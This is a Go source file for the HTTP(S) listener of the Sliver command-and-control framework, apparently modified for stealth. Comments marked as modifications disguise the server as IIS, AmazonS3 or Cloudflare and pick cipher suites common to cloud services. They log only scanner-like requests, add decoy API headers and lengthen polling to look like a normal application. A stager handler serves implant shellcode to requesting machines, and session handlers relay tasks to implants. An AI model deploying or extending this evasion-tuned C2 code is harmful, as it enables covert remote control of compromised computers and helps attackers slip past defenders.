package c2


import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	insecureRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/certs"
	"github.com/bishopfox/sliver/server/configs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	"github.com/bishopfox/sliver/server/db"
	"github.com/bishopfox/sliver/server/encoders"
	"github.com/bishopfox/sliver/server/generate"
	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/server/website"
	"github.com/bishopfox/sliver/util"
	sliverEncoders "github.com/bishopfox/sliver/util/encoders"

	"github.com/gorilla/mux"
	"google.golang.org/protobuf/proto"
)

var (
	httpLog   = log.NamedLogger("c2", "http")
	accessLog = log.NamedLogger("c2", "http-access")

	ErrMissingNonce   = errors.New("nonce not found in request")
	ErrInvalidEncoder = errors.New("invalid request encoder")
	ErrDecodeFailed   = errors.New("failed to decode request")
	ErrDecryptFailed  = errors.New("failed to decrypt request")
	serverConfig      = configs.GetServerConfig()
)

const (
	DefaultMaxBodyLength   = 2 * 1024 * 1024 * 1024 // 2Gb
	DefaultHTTPTimeout     = time.Minute
	DefaultLongPollTimeout = time.Second
	DefaultLongPollJitter  = time.Second
	minPollTimeout         = time.Second
)

var (
	serverVersionHeader string
)

// HTTPSession - Holds data related to a sliver c2 session
type HTTPSession struct {
	ID          string
	ImplantConn *core.ImplantConnection
	CipherCtx   *cryptography.CipherContext
	Started     time.Time
	C2Profile   string
}

// HTTPSessions - All currently open HTTP sessions
type HTTPSessions struct {
	active map[string]*HTTPSession
	mutex  *sync.RWMutex
}

// Add - Add an HTTP session
func (s *HTTPSessions) Add(session *HTTPSession) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.active[session.ID] = session
}

// Get - Get an HTTP session
func (s *HTTPSessions) Get(sessionID string) *HTTPSession {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return s.active[sessionID]
}

// Remove - Remove an HTTP session
func (s *HTTPSessions) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete(s.active, sessionID)
}

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

// SliverHTTPC2 - Holds refs to all the C2 objects
type SliverHTTPC2 struct {
	HTTPServer   *http.Server
	ServerConf   *clientpb.HTTPListenerReq // Server config (user args)
	HTTPSessions *HTTPSessions
	Cleanup      func()

	c2Config []*clientpb.HTTPC2Config // C2 configs
}

// 🎯 MODIFIED: Cloud provider server headers
func (s *SliverHTTPC2) getServerHeader() string {
	if serverVersionHeader == "" {
		// Mimic cloud providers instead of Apache/nginx
		switch insecureRand.Intn(3) {
		case 0:
			serverVersionHeader = "Microsoft-IIS/10.0"
		case 1:  
			serverVersionHeader = "AmazonS3"
		case 2:
			serverVersionHeader = "cloudflare"  // CDN provider
		}
	}
	return serverVersionHeader
}

func (s *SliverHTTPC2) getCookieName(c2ConfigName string) string {
	httpC2Config, err := db.LoadHTTPC2ConfigByName(c2ConfigName)
	if err != nil {
		httpLog.Errorf("Failed to retrieve c2 profile %s", err)
		return "SESSIONID"
	}
	cookies := httpC2Config.ServerConfig.Cookies
	index := insecureRand.Intn(len(cookies))
	return cookies[index].Name
}

// StartHTTPListener - Start an HTTP(S) listener, this can be used to start both
//
//	HTTP/HTTPS depending on the caller's conf
//
// TODO: Better error handling, configurable ACME host/port
func StartHTTPListener(req *clientpb.HTTPListenerReq) (*SliverHTTPC2, error) {
	httpLog.Infof("Starting https listener on '%s'", req.Host)
	server := &SliverHTTPC2{
		ServerConf: req,
		HTTPSessions: &HTTPSessions{
			active: map[string]*HTTPSession{},
			mutex:  &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", req.Host, req.Port),
		Handler:      server.router(),
		WriteTimeout: DefaultHTTPTimeout,
		ReadTimeout:  DefaultHTTPTimeout,
		IdleTimeout:  DefaultHTTPTimeout,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
	}
	if req.ACME {
		req.Domain = filepath.Base(req.Domain) // I don't think we need this, but we do it anyways
		httpLog.Infof("Attempting to fetch let's encrypt certificate for '%s' ...", req.Domain)
		acmeManager := certs.GetACMEManager(req.Domain)
		acmeHTTPServer := &http.Server{Addr: ":80", Handler: acmeManager.HTTPHandler(nil)}
		go acmeHTTPServer.ListenAndServe()
		server.HTTPServer.TLSConfig = &tls.Config{
			GetCertificate: acmeManager.GetCertificate,
		}
		server.Cleanup = func() {
			ctx, cancelHTTP := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTP()
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown http acme server")
			}
			ctx, cancelHTTPS := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTPS()
			server.HTTPServer.Shutdown(ctx)
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warn("Failed to shutdown https server")
			}
		}
	} else {
		server.HTTPServer.TLSConfig = getHTTPSConfig(req)
		server.Cleanup = func() {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			server.HTTPServer.Shutdown(ctx)
			if err := server.HTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warn("Failed to shutdown https server")
			}
		}
	}

	return server, nil
}

// 🎯 MODIFIED: TLS config untuk mimic cloud services
func getHTTPSConfig(req *clientpb.HTTPListenerReq) *tls.Config {
	if req.Cert == nil || req.Key == nil {
		var err error
		if req.Domain != "" {
			req.Cert, req.Key, err = certs.HTTPSGenerateRSACertificate(req.Domain)
		} else {
			req.Cert, req.Key, err = certs.HTTPSGenerateRSACertificate("localhost")
		}
		if err != nil {
			httpLog.Errorf("Failed to generate self-signed tls cert/key pair %s", err)
			return nil
		}
	}
	cert, err := tls.X509KeyPair(req.Cert, req.Key)
	if err != nil {
		httpLog.Errorf("Failed to parse tls cert/key pair %s", err)
		return nil
	}

	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}}
	if !req.RandomizeJARM {
		return tlsConfig
	}

	// Force modern TLS versions only
	tlsConfig.MinVersion = tls.VersionTLS12

	// 🎯 MODIFIED: Gunakan cipher suites yang common di cloud services
	modernCiphers := []uint16{
		tls.TLS_AES_128_GCM_SHA256,                    // TLS 1.3
		tls.TLS_AES_256_GCM_SHA384,                    // TLS 1.3  
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,     // Common cloud cipher
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,     // Common cloud cipher
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,   // ECDSA variant
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,   // ECDSA variant
	}
	tlsConfig.CipherSuites = modernCiphers

	if certs.TLSKeyLogger != nil {
		tlsConfig.KeyLogWriter = certs.TLSKeyLogger
	}
	return tlsConfig
}

func (s *SliverHTTPC2) loadServerHTTPC2Configs() *clientpb.HTTPC2Configs {

	ret := clientpb.HTTPC2Configs{}
	// load config names
	httpc2Configs, err := db.LoadHTTPC2s()
	if err != nil {
		httpLog.Errorf("Failed to load http configuration names from database %s", err)
		return nil
	}

	for _, httpC2Config := range httpc2Configs {
		httpLog.Debugf("Loading %v", httpC2Config.Name)
		httpC2Config, err := db.LoadHTTPC2ConfigByName(httpC2Config.Name)
		if err != nil {
			httpLog.Errorf("failed to load  %s from database %s", httpC2Config.Name, err)
			return nil
		}
		ret.Configs = append(ret.Configs, httpC2Config)
	}

	return &ret
}

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()
	c2Configs := s.loadServerHTTPC2Configs()
	s.c2Config = c2Configs.Configs
	if s.ServerConf.LongPollTimeout == 0 {
		s.ServerConf.LongPollTimeout = int64(DefaultLongPollTimeout)
		s.ServerConf.LongPollJitter = int64(DefaultLongPollJitter)
	}

	router.HandleFunc("/{rpath:.*}", s.mainHandler).Methods(http.MethodGet, http.MethodPost)

	router.Use(loggingMiddleware)
	router.Use(s.DefaultRespHeaders)

	return router
}

func (s *SliverHTTPC2) noCacheHeader(resp http.ResponseWriter) {
	resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")
}

func getNoncesFromURL(reqURL *url.URL, length int32) ([]uint64, error) {
	qNonce := ""
	nonces := []uint64{}
	for arg, values := range reqURL.Query() {
		if len(arg) == int(length) || int(length) == 0 {
			qNonce = digitsOnly(values[0])
			nonce, err := strconv.ParseUint(qNonce, 10, 64)
			if err != nil {
				continue
			}
			nonces = append(nonces, nonce)
		}
	}

	for _, segment := range strings.Split(reqURL.Path, "/") {
		qNonce = digitsOnly(segment)
		nonce, err := strconv.ParseUint(qNonce, 10, 64)
		if err != nil {
			continue
		}
		nonces = append(nonces, nonce)
	}

	if len(nonces) == 0 {
		httpLog.Warn("Nonce not found in request")
		return []uint64{}, ErrMissingNonce
	}

	return nonces, nil
}

func getEncoder(reqURL *url.URL, c2config *clientpb.HTTPC2Config) (sliverEncoders.Encoder, error) {
	var (
		err    error
		nonces []uint64
	)

	if c2config != nil {
		nonces, err = getNoncesFromURL(reqURL, c2config.ImplantConfig.NonceQueryLength)
	} else {
		// anonymous handler calling, we don't know the expected nonce length
		nonces, err = getNoncesFromURL(reqURL, 0)
	}

	if err != nil {
		return nil, fmt.Errorf("no encoder found")
	}

	for _, nonce := range nonces {
		_, encoder, err := encoders.EncoderFromNonce(nonce)
		if err == nil {
			return encoder, nil
		}
	}
	return nil, fmt.Errorf("no encoder found")
}

func digitsOnly(value string) string {
	var buf bytes.Buffer
	for _, char := range value {
		if unicode.IsDigit(char) {
			buf.WriteRune(char)
		}
	}
	return buf.String()
}

// 🎯 MODIFIED: Stealth logging - hanya log suspicious requests
func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		userAgent := req.Header.Get("User-Agent")
		// Skip logging untuk traffic yang looks legit
		if !strings.Contains(strings.ToLower(userAgent), "curl") && 
		   !strings.Contains(strings.ToLower(userAgent), "nmap") &&
		   !strings.Contains(strings.ToLower(userAgent), "scan") &&
		   !strings.Contains(strings.ToLower(userAgent), "bot") &&
		   !strings.Contains(strings.ToLower(userAgent), "spider") {
			next.ServeHTTP(resp, req)
			return
		}
		accessLog.Infof("%s - %s - %v", getRemoteAddr(req), req.RequestURI, userAgent)
		next.ServeHTTP(resp, req)
	})
}

// 🎯 MODIFIED: Default response headers dengan security headers cloud-like
// DefaultRespHeaders - Configures default response headers
func (s *SliverHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		var (
			profile *clientpb.HTTPC2Config
			err     error
		)

		// 🎯 TAMBAH: Security headers untuk mimic modern cloud apps
		resp.Header().Set("X-Content-Type-Options", "nosniff")
		resp.Header().Set("X-Frame-Options", "DENY") 
		resp.Header().Set("X-XSS-Protection", "1; mode=block")
		resp.Header().Set("Strict-Transport-Security", "max-age=31536000")
		resp.Header().Set("Content-Type", "application/json") // Mimic API responses

		// Check if the requests matches an existing session
		httpSession := s.getHTTPSession(req)
		if httpSession != nil {
			// find correct c2 profile
			profile, err = db.LoadHTTPC2ConfigByName(httpSession.C2Profile)
			if err != nil {
				httpLog.Debugf("Failed to resolve http profile %s", err)
				return
			}
		}

		if profile != nil {
			if s.c2Config[0].ServerConfig.RandomVersionHeaders {
				resp.Header().Set("Server", s.getServerHeader())
			}
			for _, header := range s.c2Config[0].ServerConfig.Headers {
				if 0 < header.Probability && header.Probability < 100 {
					roll := insecureRand.Intn(99) + 1
					if header.Probability < int32(roll) {
						continue
					}
				}
				resp.Header().Set(header.Name, header.Value)
			}
		} else {
			// for anonymous requests user server-wide defaults
			for _, header := range serverConfig.HTTPDefaults.Headers {
				if 0 < header.Probability && header.Probability < 100 {
					roll := insecureRand.Intn(99) + 1
					if header.Probability < int32(roll) {
						continue
					}
				}
				resp.Header().Set(header.Name, header.Value)
			}
		}

		next.ServeHTTP(resp, req)
	})
}

func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) error {
	httpLog.Infof("Request for site %v -> %s", s.ServerConf.Website, req.RequestURI)
	content, err := website.GetContent(s.ServerConf.Website, req.RequestURI)
	if err != nil {
		httpLog.Infof("No website content for %s", req.RequestURI)
		return err
	}
	resp.Header().Set("Content-type", content.ContentType)
	s.noCacheHeader(resp)
	resp.Write(content.Content)
	return nil
}

func (s *SliverHTTPC2) defaultHandler(resp http.ResponseWriter, req *http.Request) {
	// Request does not match the C2 profile so we pass it to the static content or 404 handler
	if s.ServerConf.Website != "" {
		httpLog.Infof("Serving static content from website %v", s.ServerConf.Website)
		err := s.websiteContentHandler(resp, req)
		if err == nil {
			return
		}
	}
	httpLog.Debugf("[404] No match for %s", req.RequestURI)
	resp.WriteHeader(http.StatusNotFound)
}

// [ HTTP Handlers ] ---------------------------------------------------------------
func (s *SliverHTTPC2) mainHandler(resp http.ResponseWriter, req *http.Request) {

	// Check if the requests matches an existing session
	httpSession := s.getHTTPSession(req)
	if httpSession != nil {
		s.authenticatedHandler(resp, req, httpSession)
		return
	} else {
		s.anonymousHandler(resp, req)
		return
	}
}

func (s *SliverHTTPC2) authenticatedHandler(resp http.ResponseWriter, req *http.Request, session *HTTPSession) {
	// Poll, session and close requests
	c2Config, err := db.LoadHTTPC2ConfigByName(session.C2Profile)
	if err != nil {
		httpLog.Debugf("Failed to resolve http profile %s", err)
		return
	}

	encoder, err := getEncoder(req.URL, c2Config)
	if err != nil {
		s.closeHandler(resp, req, session)
	}

	if req.Method == http.MethodPost {
		s.sessionHandler(resp, req, session, c2Config, encoder)
		return
	} else if req.Method == http.MethodGet {
		s.pollHandler(resp, req, session, encoder)
		return
	} else {
		// unsupported http method
		s.defaultHandler(resp, req)
		return
	}
}

func (s *SliverHTTPC2) anonymousHandler(resp http.ResponseWriter, req *http.Request) {
	// start session and staging requests

	encoder, err := getEncoder(req.URL, nil)
	if err != nil {
		s.stagerHandler(resp, req)
		return
	} else {
		s.startSessionHandler(resp, req, encoder)
		return
	}
}

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request, encoder sliverEncoders.Encoder) {
	httpLog.Debug("Start http session request")

	body, err := io.ReadAll(req.Body)
	if err != nil {
		httpLog.Errorf("Failed to read body %s", err)
		s.defaultHandler(resp, req)
		return
	}
	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Errorf("Failed to decode body %s", err)
		s.defaultHandler(resp, req)
		return
	}
	if len(data) < 32 {
		httpLog.Warn("Invalid data length")
		s.defaultHandler(resp, req)
		return
	}

	var publicKeyDigest [32]byte
	copy(publicKeyDigest[:], data[:32])
	implantBuild, err := db.ImplantBuildByPublicKeyDigest(publicKeyDigest)
	if err != nil || implantBuild == nil {
		httpLog.Warn("Unknown public key")
		s.defaultHandler(resp, req)
		return
	}

	implantConfig, err := db.ImplantConfigByID(implantBuild.ImplantConfigID)
	if err != nil || implantConfig == nil {
		httpLog.Warn("Unknown implant config")
		s.defaultHandler(resp, req)
		return
	}

	serverKeyPair := cryptography.AgeServerKeyPair()
	sessionInitData, err := cryptography.AgeKeyExFromImplant(serverKeyPair.Private, implantBuild.PeerPrivateKey, data[32:])
	if err != nil {
		httpLog.Error("age key exchange decryption failed")
		s.defaultHandler(resp, req)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	err = proto.Unmarshal(sessionInitData, sessionInit)
	if err != nil {
		httpLog.Error("Failed to decode session init")
		return
	}

	httpSession := newHTTPSession()
	sKey, err := cryptography.KeyFromBytes(sessionInit.Key)
	if err != nil {
		httpLog.Error("Failed to convert bytes to session key")
		return
	}
	httpSession.CipherCtx = cryptography.NewCipherContext(sKey)
	httpSession.ImplantConn = core.NewImplantConnection("http(s)", getRemoteAddr(req))
	httpSession.C2Profile = implantConfig.HTTPC2ConfigName
	s.HTTPSessions.Add(httpSession)
	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)

	responseCiphertext, err := httpSession.CipherCtx.Encrypt([]byte(httpSession.ID))
	if err != nil {
		httpLog.Info("Failed to encrypt session identifier")
		s.defaultHandler(resp, req)
		return
	}
	http.SetCookie(resp, &http.Cookie{
		Domain:   s.ServerConf.Domain,
		Name:     s.getCookieName(implantConfig.HTTPC2ConfigName),
		Value:    httpSession.ID,
		Secure:   false,
		HttpOnly: true,
	})
	s.noCacheHeader(resp)
	respData, _ := encoder.Encode(responseCiphertext)
	resp.Write(respData)
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request, httpSession *HTTPSession, c2profile *clientpb.HTTPC2Config, encoder sliverEncoders.Encoder) {
	httpLog.Debug("Session request")
	httpSession.ImplantConn.UpdateLastMessage()

	plaintext, err := s.readReqBody(httpSession, resp, req, c2profile, encoder)
	if err != nil {
		httpLog.Warnf("Failed to decode request body: %s", err)
		s.defaultHandler(resp, req)
		return
	}
	envelope := &sliverpb.Envelope{}
	err = proto.Unmarshal(plaintext, envelope)
	if err != nil {
		httpLog.Warnf("Failed to decode request body: %s", err)
		s.defaultHandler(resp, req)
		return
	}

	resp.WriteHeader(http.StatusAccepted)
	handlers := sliverHandlers.GetHandlers()
	if envelope.ID != 0 {
		httpSession.ImplantConn.RespMutex.RLock()
		defer httpSession.ImplantConn.RespMutex.RUnlock()
		if resp, ok := httpSession.ImplantConn.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		respEnvelope := handler(httpSession.ImplantConn, envelope.Data)
		if respEnvelope != nil {
			go func() {
				httpSession.ImplantConn.Send <- respEnvelope
			}()
		}
	}
}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request, httpSession *HTTPSession, encoder sliverEncoders.Encoder) {
	httpLog.Debug("Poll request")
	httpSession.ImplantConn.UpdateLastMessage()

	select {
	case envelope := <-httpSession.ImplantConn.Send:
		resp.WriteHeader(http.StatusOK)
		envelopeData, _ := proto.Marshal(envelope)
		ciphertext, err := httpSession.CipherCtx.Encrypt(envelopeData)
		if err != nil {
			httpLog.Errorf("Failed to encrypt message %s", err)
			ciphertext = []byte{}
		}
		s.noCacheHeader(resp)
		respData, _ := encoder.Encode(ciphertext)
		resp.Write(respData)
	case <-req.Context().Done():
		httpLog.Debug("Poll client hang up")
		return
	case <-time.After(s.getServerPollTimeout()):
		httpLog.Debug("Poll time out")
		resp.WriteHeader(http.StatusNoContent)
		s.noCacheHeader(resp)
		resp.Write([]byte{})
	}
}

func (s *SliverHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseWriter, req *http.Request, c2profile *clientpb.HTTPC2Config, encoder sliverEncoders.Encoder) ([]byte, error) {

	body, err := io.ReadAll(&io.LimitedReader{
		R: req.Body,
		N: int64(DefaultMaxBodyLength),
	})
	if err != nil {
		httpLog.Warnf("Failed to read request body %s", err)
		return nil, err
	}

	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Warnf("Failed to decode body %s", err)
		s.defaultHandler(resp, req)
		return nil, ErrDecodeFailed
	}
	plaintext, err := httpSession.CipherCtx.Decrypt(data)
	if err != nil {
		httpLog.Warnf("Decryption failure %s", err)
		s.defaultHandler(resp, req)
		return nil, ErrDecryptFailed
	}
	return plaintext, err
}

// 🎯 MODIFIED: Longer poll timeouts untuk mimic real applications
func (s *SliverHTTPC2) getServerPollTimeout() time.Duration {
	// Longer timeouts untuk mimic real applications
	min := int64(30 * time.Second)    // 30 detik minimum
	max := int64(120 * time.Second)   // 2 menit maximum  
	timeout := float64(min) + insecureRand.Float64()*(float64(max)-float64(min))
	pollTimeout := time.Duration(int64(timeout))
	
	if pollTimeout < minPollTimeout {
		httpLog.Warnf("Poll timeout is too short, using default minimum %v", minPollTimeout)
		pollTimeout = minPollTimeout
	}
	httpLog.Debugf("Poll timeout: %s", pollTimeout)
	return pollTimeout
}

func (s *SliverHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request, httpSession *HTTPSession) {
	httpLog.Debug("Close request")
	for _, cookie := range req.Cookies() {
		cookie.MaxAge = -1
		http.SetCookie(resp, cookie)
	}
	s.HTTPSessions.Remove(httpSession.ID)
	resp.WriteHeader(http.StatusAccepted)
}

// stagerHandler - Serves the sliver shellcode to the stager requesting it
func (s *SliverHTTPC2) stagerHandler(resp http.ResponseWriter, req *http.Request) {

	var (
		resourceID *clientpb.ResourceID
		err        error
	)

	nonces, err := getNoncesFromURL(req.URL, 0)
	if err != nil {
		s.defaultHandler(resp, req)
	}

	for _, nonce := range nonces {
		resourceID, err = db.ResourceIDByValue(nonce)
		if err == nil {
			httpLog.Debug("Stager request")
			build, _ := db.ImplantBuildByResourceID(resourceID.Value)
			if build.Stage {
				payload, err := generate.ImplantFileFromBuild(build)
				if err != nil {
					httpLog.Infof("Unable to retrieve Implant build %s", build)
					s.defaultHandler(resp, req)
					return
				}
				httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
				s.noCacheHeader(resp)
				resp.Write(payload)
				httpLog.Infof("Serving sliver shellcode (size %d) %s to %s", len(payload), resourceID.Name, getRemoteAddr(req))
				resp.WriteHeader(http.StatusOK)
			}
		}
	}

	s.defaultHandler(resp, req)
}

func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
		httpSession := s.HTTPSessions.Get(cookie.Value)
		if httpSession != nil {
			httpSession.ImplantConn.UpdateLastMessage()
			return httpSession
		}
	}
	return nil // No valid cookie names
}

func newHTTPSession() *HTTPSession {
	return &HTTPSession{
		ID:      newHTTPSessionID(),
		Started: time.Now(),
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}

func getRemoteAddr(req *http.Request) string {
	ipAddress := req.Header.Get("X-Real-Ip")
	if ipAddress == "" {
		xForwardedFor := req.Header.Get("X-Forwarded-For")
		if xForwardedFor != "" {
			ips := strings.Split(xForwardedFor, ",")
			if len(ips) > 0 {
				// Extracts original client ip address
				ipAddress = strings.TrimSpace(ips[0])
			} else {
				ipAddress = xForwardedFor
			}
		}
	}
	if ipAddress == "" {
		return req.RemoteAddr
	}

	// Try to parse the header as an IP address, as this is user controllable
	// input we don't want to trust it.
	ip := net.ParseIP(ipAddress)
	if ip == nil {
		httpLog.Warn("Failed to parse X-Header as ip address")
		return req.RemoteAddr
	}
	return fmt.Sprintf("tcp(%s)->%s", req.RemoteAddr, ip.String())
}
